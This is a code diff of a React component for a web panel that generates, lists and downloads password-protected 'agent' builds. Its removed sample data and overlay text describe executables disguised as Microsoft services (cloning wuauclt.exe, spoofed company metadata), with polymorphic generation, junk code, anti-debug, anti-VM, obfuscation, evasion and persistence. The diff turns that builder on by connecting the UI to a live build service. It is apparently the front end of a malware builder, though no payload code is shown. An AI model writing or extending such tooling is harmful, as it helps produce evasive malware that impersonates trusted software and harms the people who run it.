@@ -1,25 +1,9 @@
-import React, { useState, useEffect } from 'react';
-import { FiDownload, FiSettings, FiShield, FiCpu, FiZap, FiEye, FiEyeOff, FiCopy, FiRefreshCw, FiCheckCircle, FiAlertCircle } from 'react-icons/fi';
+import React, { useState, useEffect, useRef } from 'react';
+import { Download, Settings, Zap, Eye, EyeOff, RefreshCw, AlertCircle, Trash2 } from 'lucide-react';
+import { agentService, AgentBuild as AgentBuildType, templateService, AgentTemplate as AgentTemplateType } from '../services/agentService';
+import { WS_URL } from '../config';
 
-interface AgentBuild {
-  id: string;
-  name: string;
-  version: string;
-  createdAt: string;
-  status: 'generating' | 'ready' | 'error';
-  downloadUrl?: string;
-  archivePassword?: string;
-  serviceName?: string;
-  serviceDescription?: string;
-  serviceVersion?: string;
-  serviceCompany?: string;
-  serviceProduct?: string;
-  clonedService?: string;
-  junkCodeLines?: number;
-  entryPoint?: string;
-  size?: string;
-  features: string[];
-}
+// Use AgentBuildType from service
 
 interface AgentConfig {
   // Basic Configuration
@@ -94,41 +78,18 @@ const AgentSection: React.FC = () => {
     enableSystemInfo: true
   });
 
-  const [agentBuilds, setAgentBuilds] = useState<AgentBuild[]>([
-    {
-      id: '1',
-      name: 'WindowsUpdateService_v1.0',
-      version: '1.0.0',
-      createdAt: '2024-09-27 10:30:00',
-      status: 'ready',
-      downloadUrl: '/downloads/agent_1.zip',
-      archivePassword: 'ArchivePass123!@#',
-      serviceName: 'WindowsUpdateService',
-      serviceDescription: 'Windows Update Service',
-      serviceVersion: '10.0.19041.1',
-      serviceCompany: 'Microsoft Corporation',
-      serviceProduct: 'Microsoft Windows Operating System',
-      clonedService: 'wuauclt.exe',
-      junkCodeLines: 150,
-      entryPoint: 'WinMain',
-      size: '2.4 MB',
-      features: ['Microsoft service cloning', 'Code signing', 'Polymorphic generation', 'Junk code injection', 'Anti-analysis']
-    },
-    {
-      id: '2',
-      name: 'WindowsSecurityAgent_v1.1',
-      version: '1.1.0',
-      createdAt: '2024-09-27 11:15:00',
-      status: 'generating',
-      features: ['Anti-Debug', 'Anti-VM', 'Code Obfuscation', 'String Encryption']
-    }
-  ]);
-  
+  const [agentBuilds, setAgentBuilds] = useState<AgentBuildType[]>([]);
   const [isGenerating, setIsGenerating] = useState(false);
-  const [generationProgress, setGenerationProgress] = useState(0);
+  const [generationProgress, setGenerationProgress] = useState<{ [key: string]: number }>({});
   const [showPasswords, setShowPasswords] = useState<{ [key: string]: boolean }>({});
   const [copiedPasswords, setCopiedPasswords] = useState<{ [key: string]: boolean }>({});
   const [showAdvanced, setShowAdvanced] = useState(false);
+  const wsRef = useRef<WebSocket | null>(null);
+  const [templates, setTemplates] = useState<AgentTemplateType[]>([]);
+  const [showTemplateModal, setShowTemplateModal] = useState(false);
+  const [templateName, setTemplateName] = useState('');
+  const [templateDescription, setTemplateDescription] = useState('');
+  const [templateIsPublic, setTemplateIsPublic] = useState(false);
 
   const handleConfigChange = (key: keyof AgentConfig, value: any) => {
     setAgentConfig(prev => ({ ...prev, [key]: value }));
@@ -172,79 +133,244 @@ const AgentSection: React.FC = () => {
     }
   };
 
+  // Display password modal/popup when password is shown
+  const getPasswordDisplay = (build: AgentBuildType) => {
+    if (!showPasswords[build._id]) return null;
+    const password = build.metadata?.password || '';
+    return (
+      <div className="mt-2 p-2 bg-gray-800 rounded text-sm">
+        <div className="flex items-center justify-between">
+          <span className="text-white font-mono">{password}</span>
+          <button
+            onClick={() => copyPassword(password, build._id)}
+            className="ml-2 text-blue-400 hover:text-blue-300"
+          >
+            {copiedPasswords[build._id] ? 'Copied!' : 'Copy'}
+          </button>
+        </div>
+      </div>
+    );
+  };
+
+  // Fetch builds and templates on mount
+  useEffect(() => {
+    fetchBuilds();
+    fetchTemplates();
+  }, []);
+
+  // Fetch templates when templates tab is active
+  useEffect(() => {
+    if (activeTab === 'templates') {
+      fetchTemplates();
+    }
+  }, [activeTab]);
+
+  // WebSocket connection for real-time updates
+  useEffect(() => {
+    const token = localStorage.getItem('accessToken');
+    if (!token) return;
+
+    const ws = new WebSocket(WS_URL);
+    wsRef.current = ws;
+
+    ws.onopen = () => {
+      console.log('[AgentSection] WebSocket connected');
+      ws.send(JSON.stringify({
+        type: 'web_client',
+        token: token
+      }));
+    };
+
+    ws.onmessage = (event) => {
+      try {
+        const data = JSON.parse(event.data);
+        
+        if (data.type === 'build_queued' || data.type === 'build_progress' || 
+            data.type === 'build_completed' || data.type === 'build_error' || 
+            data.type === 'build_deleted') {
+          handleBuildEvent(data);
+        }
+      } catch (error) {
+        console.error('Error parsing WebSocket message:', error);
+      }
+    };
+
+    ws.onerror = (error) => {
+      console.error('[AgentSection] WebSocket error:', error);
+    };
+
+    ws.onclose = () => {
+      console.log('[AgentSection] WebSocket disconnected');
+      // Reconnect after 5 seconds
+      setTimeout(() => {
+        if (wsRef.current?.readyState === WebSocket.CLOSED) {
+          // Reconnect logic handled by useEffect
+        }
+      }, 5000);
+    };
+
+    return () => {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.close();
+      }
+    };
+  }, []);
+
+  const fetchBuilds = async () => {
+    try {
+      const result = await agentService.getBuilds({ limit: 50 });
+      setAgentBuilds(result.builds);
+    } catch (error) {
+      console.error('Error fetching builds:', error);
+    }
+  };
+
+  const handleBuildEvent = (data: any) => {
+    if (data.type === 'build_deleted') {
+      setAgentBuilds(prev => prev.filter(build => build._id !== data.buildId));
+      return;
+    }
+
+    if (data.type === 'build_queued') {
+      // Build will be added when we fetch or receive progress
+      fetchBuilds();
+      return;
+    }
+
+    if (data.type === 'build_progress') {
+      setGenerationProgress(prev => ({
+        ...prev,
+        [data.buildId]: data.progress
+      }));
+      
+      // Update build in list
+      setAgentBuilds(prev => prev.map(build => 
+        build._id === data.buildId 
+          ? { ...build, status: data.status, progress: data.progress }
+          : build
+      ));
+      
+      // If build not in list, fetch it
+      if (!agentBuilds.find(b => b._id === data.buildId)) {
+        fetchBuilds();
+      }
+      return;
+    }
+
+    if (data.type === 'build_completed' || data.type === 'build_error') {
+      fetchBuilds(); // Refresh to get full build data
+      setGenerationProgress(prev => {
+        const newProgress = { ...prev };
+        delete newProgress[data.buildId];
+        return newProgress;
+      });
+    }
+  };
+
   const handleGenerateAgent = async () => {
     setIsGenerating(true);
-    setGenerationProgress(0);
 
     try {
-      const token = localStorage.getItem('accessToken');
-      const response = await fetch('/api/agent/generate-agent', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${token}`
-        },
-        body: JSON.stringify(agentConfig)
-      });
-
-      if (!response.ok) {
-        throw new Error('Failed to generate agent');
-      }
-
-      const result = await response.json();
-
-      // Simulate generation process with real progress
-      const steps = [
-        'Initializing polymorphic engine...',
-        'Generating unique code structure...',
-        'Creating polymorphic entry point...',
-        'Implementing communication layer...',
-        'Adding evasion techniques...',
-        'Implementing persistence methods...',
-        'Applying code obfuscation...',
-        'Encrypting strings and API calls...',
-        'Generating MSI package...',
-        'Compiling polymorphic executable...',
-        'Creating installation script...',
-        'Finalizing agent package...'
-      ];
-
-      for (let i = 0; i < steps.length; i++) {
-        await new Promise(resolve => setTimeout(resolve, 800));
-        setGenerationProgress(((i + 1) / steps.length) * 100);
-      }
-
-      // Add new build with real data
-      const newBuild: AgentBuild = {
-        id: result.agentId,
-        name: agentConfig.agentName || generateRandomName(),
-        version: '1.0.0',
-        createdAt: new Date().toLocaleString(),
-        status: 'ready',
-        downloadUrl: result.archiveDownloadUrl,
-        archivePassword: result.archivePassword,
-        serviceName: result.serviceName,
-        serviceDescription: result.serviceDescription,
-        serviceVersion: result.serviceVersion,
-        serviceCompany: result.serviceCompany,
-        serviceProduct: result.serviceProduct,
-        clonedService: result.clonedService,
-        junkCodeLines: result.junkCodeLines,
-        entryPoint: result.entryPoint,
-        size: `${(Math.random() * 3 + 1).toFixed(1)} MB`,
-        features: result.securityFeatures || Object.entries(agentConfig)
-          .filter(([key, value]) => key.startsWith('enable') && value)
-          .map(([key]) => key.replace('enable', '').replace(/([A-Z])/g, ' $1').trim())
-      };
-
-      setAgentBuilds(prev => [newBuild, ...prev]);
+      const build = await agentService.generateAgent(agentConfig);
       
-    } catch (error) {
+      // Add to list immediately
+      setAgentBuilds(prev => [build, ...prev]);
+      setGenerationProgress(prev => ({
+        ...prev,
+        [build._id]: 0
+      }));
+      
+    } catch (error: any) {
       console.error('Error generating agent:', error);
-      alert('Failed to generate agent. Please try again.');
+      alert(error.message || 'Failed to generate agent. Please try again.');
     } finally {
       setIsGenerating(false);
-      setGenerationProgress(0);
+    }
+  };
+
+  const handleDeleteBuild = async (buildId: string) => {
+    if (!confirm('Are you sure you want to delete this build?')) {
+      return;
+    }
+
+    try {
+      await agentService.deleteBuild(buildId);
+      setAgentBuilds(prev => prev.filter(build => build._id !== buildId));
+    } catch (error: any) {
+      console.error('Error deleting build:', error);
+      alert(error.message || 'Failed to delete build');
+    }
+  };
+
+  const handleDownloadBuild = async (build: AgentBuildType) => {
+    try {
+      const blob = await agentService.downloadBuild(build._id);
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `agent_${build.agentId}.zip`;
+      document.body.appendChild(a);
+      a.click();
+      window.URL.revokeObjectURL(url);
+      document.body.removeChild(a);
+    } catch (error: any) {
+      console.error('Error downloading build:', error);
+      alert(error.message || 'Failed to download build');
+    }
+  };
+
+  const fetchTemplates = async () => {
+    try {
+      const result = await templateService.getTemplates({ limit: 50 });
+      setTemplates(result.templates);
+    } catch (error) {
+      console.error('Error fetching templates:', error);
+    }
+  };
+
+  const handleUseTemplate = async (templateId: string) => {
+    try {
+      const config = await templateService.useTemplate(templateId);
+      setAgentConfig(config);
+      setActiveTab('generate');
+      fetchTemplates(); // Refresh to update usage count
+    } catch (error: any) {
+      console.error('Error using template:', error);
+      alert(error.message || 'Failed to load template');
+    }
+  };
+
+  const handleSaveTemplate = async () => {
+    if (!templateName.trim()) {
+      alert('Template name is required');
+      return;
+    }
+
+    try {
+      await templateService.createTemplate(templateName, templateDescription, agentConfig, templateIsPublic);
+      setShowTemplateModal(false);
+      setTemplateName('');
+      setTemplateDescription('');
+      setTemplateIsPublic(false);
+      fetchTemplates();
+      alert('Template saved successfully!');
+    } catch (error: any) {
+      console.error('Error saving template:', error);
+      alert(error.message || 'Failed to save template');
+    }
+  };
+
+  const handleDeleteTemplate = async (templateId: string) => {
+    if (!confirm('Are you sure you want to delete this template?')) {
+      return;
+    }
+
+    try {
+      await templateService.deleteTemplate(templateId);
+      fetchTemplates();
+    } catch (error: any) {
+      console.error('Error deleting template:', error);
+      alert(error.message || 'Failed to delete template');
     }
   };
 
@@ -272,7 +398,7 @@ const AgentSection: React.FC = () => {
                 onClick={() => handleConfigChange('agentName', generateRandomName())}
                 className="px-3 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors"
               >
-                <FiRefreshCw className="w-4 h-4" />
+                <RefreshCw className="w-4 h-4" />
               </button>
             </div>
           </div>
@@ -293,7 +419,7 @@ const AgentSection: React.FC = () => {
                 onClick={() => handleConfigChange('serviceName', generateRandomName())}
                 className="px-3 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors"
               >
-                <FiRefreshCw className="w-4 h-4" />
+                <RefreshCw className="w-4 h-4" />
               </button>
             </div>
           </div>
@@ -313,26 +439,33 @@ const AgentSection: React.FC = () => {
         </div>
       </div>
 
-      {/* Generation Progress */}
-      {isGenerating && (
+      {/* Active Build Progress */}
+      {Object.keys(generationProgress).length > 0 && (
         <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
           <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
-            🔄 Generating Agent
+            🔄 Active Builds
           </h3>
           
           <div className="space-y-4">
-            <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
-              <div 
-                className="bg-primary h-2 rounded-full transition-all duration-300"
-                style={{ width: `${generationProgress}%` }}
-              ></div>
-            </div>
-            
-            <div className="text-center">
-              <span className="text-sm text-bodydark2">
-                {generationProgress.toFixed(0)}% Complete
-              </span>
-            </div>
+            {Object.entries(generationProgress).map(([buildId, progress]) => {
+              const build = agentBuilds.find(b => b._id === buildId);
+              if (!build) return null;
+              
+              return (
+                <div key={buildId} className="space-y-2">
+                  <div className="flex justify-between text-sm">
+                    <span className="text-black dark:text-white">{build.name}</span>
+                    <span className="text-bodydark2">{progress}%</span>
+                  </div>
+                  <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
+                    <div 
+                      className="bg-primary h-2 rounded-full transition-all duration-300"
+                      style={{ width: `${progress}%` }}
+                    ></div>
+                  </div>
+                </div>
+              );
+            })}
           </div>
         </div>
       )}
@@ -344,7 +477,7 @@ const AgentSection: React.FC = () => {
           disabled={isGenerating || !agentConfig.agentName || !agentConfig.serviceName}
           className="px-8 py-3 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center"
         >
-          <FiZap className="w-5 h-5 mr-2" />
+          <Zap className="w-5 h-5 mr-2" />
           {isGenerating ? 'Generating...' : 'Generate Agent'}
         </button>
       </div>
@@ -502,51 +635,73 @@ const AgentSection: React.FC = () => {
               </tr>
             </thead>
             <tbody>
-              {agentBuilds.map((build) => (
-                <tr key={build.id} className="hover:bg-gray-700 transition-colors">
-                  <td className="px-6 py-4">
-                    <div className="font-medium text-white">{build.name}</div>
-                    <div className="text-xs text-gray-400">{build.description}</div>
-                  </td>
-                  <td className="px-6 py-4 text-white">{build.version}</td>
-                  <td className="px-6 py-4">
-                    <span className={`px-2 py-1 text-xs font-medium rounded-full ${
-                      build.status === 'ready' ? 'bg-green-100 text-green-800' :
-                      build.status === 'generating' ? 'bg-yellow-100 text-yellow-800' :
-                      'bg-red-100 text-red-800'
-                    }`}>
-                      {build.status}
-                    </span>
-                  </td>
-                  <td className="px-6 py-4 text-white">{build.size || '-'}</td>
-                  <td className="px-6 py-4 text-white">{build.createdAt}</td>
-                  <td className="px-6 py-4">
-                    <div className="flex space-x-2">
-                      {build.status === 'ready' && (
-                        <>
-                          <button 
-                            onClick={() => window.open(`http://localhost:8080/api/agent/downloads/${build.downloadUrl?.split('/').pop()}`, '_blank')}
-                            className="text-blue-400 hover:text-blue-300"
-                            title="Download Password-Protected Archive"
-                          >
-                            <FiDownload className="w-4 h-4" />
-                          </button>
-                        </>
-                      )}
-                      <button 
-                        onClick={() => togglePasswordVisibility(build.id)}
-                        className="text-yellow-400 hover:text-yellow-300"
-                        title="Show/Hide Passwords"
-                      >
-                        {showPasswords[build.id] ? <FiEyeOff className="w-4 h-4" /> : <FiEye className="w-4 h-4" />}
-                      </button>
-                      <button className="text-red-400 hover:text-red-300">
-                        <FiAlertCircle className="w-4 h-4" />
-                      </button>
-                    </div>
+              {agentBuilds.length === 0 ? (
+                <tr>
+                  <td colSpan={6} className="px-6 py-8 text-center text-gray-400">
+                    No builds found. Generate your first agent to get started.
                   </td>
                 </tr>
-              ))}
+              ) : (
+                agentBuilds.map((build) => (
+                  <tr key={build._id} className="hover:bg-gray-700 transition-colors">
+                    <td className="px-6 py-4">
+                      <div className="font-medium text-white">{build.name}</div>
+                      {build.description && (
+                        <div className="text-xs text-gray-400">{build.description}</div>
+                      )}
+                    </td>
+                    <td className="px-6 py-4 text-white">{build.version}</td>
+                    <td className="px-6 py-4">
+                      <span className={`px-2 py-1 text-xs font-medium rounded-full ${
+                        build.status === 'ready' ? 'bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200' :
+                        build.status === 'generating' || build.status === 'compiling' || build.status === 'packaging' ? 'bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-200' :
+                        build.status === 'error' ? 'bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-200' :
+                        'bg-gray-100 text-gray-800 dark:bg-gray-700 dark:text-gray-300'
+                      }`}>
+                        {build.status}
+                        {build.progress !== undefined && build.progress > 0 && build.progress < 100 && (
+                          <span className="ml-2">({build.progress}%)</span>
+                        )}
+                      </span>
+                    </td>
+                    <td className="px-6 py-4 text-white">
+                      {build.fileSize ? `${(build.fileSize / 1024 / 1024).toFixed(2)} MB` : '-'}
+                    </td>
+                    <td className="px-6 py-4 text-white">
+                      {new Date(build.createdAt).toLocaleString()}
+                    </td>
+                    <td className="px-6 py-4">
+                      <div className="flex space-x-2">
+                        {build.status === 'ready' && (
+                          <button 
+                            onClick={() => handleDownloadBuild(build)}
+                            className="text-blue-400 hover:text-blue-300"
+                            title="Download Build"
+                          >
+                            <Download className="w-4 h-4" />
+                          </button>
+                        )}
+                        {build.metadata?.password && (
+                          <button 
+                            onClick={() => togglePasswordVisibility(build._id)}
+                            className="text-yellow-400 hover:text-yellow-300"
+                            title="Show/Hide Password"
+                          >
+                            {showPasswords[build._id] ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                          </button>
+                        )}
+                        <button 
+                          onClick={() => handleDeleteBuild(build._id)}
+                          className="text-red-400 hover:text-red-300"
+                          title="Delete Build"
+                        >
+                          <Trash2 className="w-4 h-4" />
+                        </button>
+                      </div>
+                    </td>
+                  </tr>
+                ))
+              )}
             </tbody>
           </table>
         </div>
@@ -554,25 +709,153 @@ const AgentSection: React.FC = () => {
     </div>
   );
 
-  return (
-    <div className="space-y-6 relative">
-      {/* Coming Soon Overlay */}
-      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center rounded-lg">
-        <div className="text-center p-8">
-          <div className="text-6xl mb-4">🚀</div>
-          <h2 className="text-3xl font-bold text-white mb-4">Advanced Agent Builder</h2>
-          <p className="text-xl text-gray-300 mb-6">Coming Soon</p>
-          <div className="bg-gray-800/50 rounded-lg p-4 max-w-md mx-auto">
-            <p className="text-gray-400 text-sm">
-              We're working on an advanced polymorphic agent builder with MSI packaging, 
-              evasion techniques, and stealth capabilities. Stay tuned!
-            </p>
-          </div>
-        </div>
+  const renderTemplatesTab = () => (
+    <div className="space-y-6">
+      <div className="flex justify-between items-center">
+        <h3 className="text-lg font-semibold text-black dark:text-white">
+          📋 Agent Templates
+        </h3>
+        <button
+          onClick={() => setShowTemplateModal(true)}
+          className="px-4 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors flex items-center"
+        >
+          <Settings className="w-4 h-4 mr-2" />
+          Save Current Config as Template
+        </button>
       </div>
 
-      {/* Original Content (Preserved but Disabled) */}
-      <div className="opacity-30 pointer-events-none">
+      {templates.length === 0 ? (
+        <div className="text-center py-12 bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark">
+          <Settings className="w-12 h-12 text-gray-400 mx-auto mb-4" />
+          <p className="text-bodydark2">No templates found. Save your first template to get started.</p>
+        </div>
+      ) : (
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+          {templates.map((template) => (
+            <div
+              key={template._id}
+              className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6 hover:shadow-md transition-shadow"
+            >
+              <div className="flex justify-between items-start mb-4">
+                <div>
+                  <h4 className="font-semibold text-black dark:text-white">{template.name}</h4>
+                  {template.description && (
+                    <p className="text-sm text-bodydark2 mt-1">{template.description}</p>
+                  )}
+                </div>
+                {template.isPublic && (
+                  <span className="px-2 py-1 text-xs bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-200 rounded">
+                    Public
+                  </span>
+                )}
+              </div>
+
+              <div className="text-sm text-bodydark2 mb-4">
+                <p>Used: {template.usageCount} times</p>
+                {template.lastUsedAt && (
+                  <p>Last used: {new Date(template.lastUsedAt).toLocaleDateString()}</p>
+                )}
+                {template.createdBy && (
+                  <p>By: {template.createdBy.username}</p>
+                )}
+              </div>
+
+              <div className="flex space-x-2">
+                <button
+                  onClick={() => handleUseTemplate(template._id)}
+                  className="flex-1 px-4 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors"
+                >
+                  Use Template
+                </button>
+                <button
+                  onClick={() => handleDeleteTemplate(template._id)}
+                  className="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 transition-colors"
+                  title="Delete Template"
+                >
+                  <Trash2 className="w-4 h-4" />
+                </button>
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {/* Save Template Modal */}
+      {showTemplateModal && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white dark:bg-boxdark rounded-lg shadow-lg p-6 w-full max-w-md">
+            <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
+              Save Template
+            </h3>
+            
+            <div className="space-y-4">
+              <div>
+                <label className="block text-sm font-medium text-black dark:text-white mb-2">
+                  Template Name *
+                </label>
+                <input
+                  type="text"
+                  value={templateName}
+                  onChange={(e) => setTemplateName(e.target.value)}
+                  placeholder="Enter template name"
+                  className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
+                />
+              </div>
+
+              <div>
+                <label className="block text-sm font-medium text-black dark:text-white mb-2">
+                  Description
+                </label>
+                <textarea
+                  value={templateDescription}
+                  onChange={(e) => setTemplateDescription(e.target.value)}
+                  placeholder="Enter template description"
+                  rows={3}
+                  className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
+                />
+              </div>
+
+              <div className="flex items-center">
+                <input
+                  type="checkbox"
+                  id="templatePublic"
+                  checked={templateIsPublic}
+                  onChange={(e) => setTemplateIsPublic(e.target.checked)}
+                  className="mr-2"
+                />
+                <label htmlFor="templatePublic" className="text-sm text-black dark:text-white">
+                  Make this template public
+                </label>
+              </div>
+            </div>
+
+            <div className="flex justify-end space-x-2 mt-6">
+              <button
+                onClick={() => {
+                  setShowTemplateModal(false);
+                  setTemplateName('');
+                  setTemplateDescription('');
+                  setTemplateIsPublic(false);
+                }}
+                className="px-4 py-2 border border-stroke dark:border-strokedark rounded-lg text-black dark:text-white hover:bg-gray-100 dark:hover:bg-gray-800"
+              >
+                Cancel
+              </button>
+              <button
+                onClick={handleSaveTemplate}
+                className="px-4 py-2 bg-primary text-white rounded-lg hover:bg-primary/90"
+              >
+                Save Template
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+
+  return (
+    <div className="space-y-6">
         {/* Header */}
         <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
           <h1 className="text-2xl font-bold text-black dark:text-white mb-2">
@@ -613,15 +896,9 @@ const AgentSection: React.FC = () => {
             {activeTab === 'generate' && renderGenerateTab()}
             {activeTab === 'config' && renderConfigTab()}
             {activeTab === 'builds' && renderBuildsTab()}
-            {activeTab === 'templates' && (
-              <div className="text-center py-12">
-                <FiSettings className="w-12 h-12 text-gray-400 mx-auto mb-4" />
-                <p className="text-bodydark2">Templates coming soon...</p>
-              </div>
-            )}
+            {activeTab === 'templates' && renderTemplatesTab()}
           </div>
         </div>
-      </div>
     </div>
   );
 };
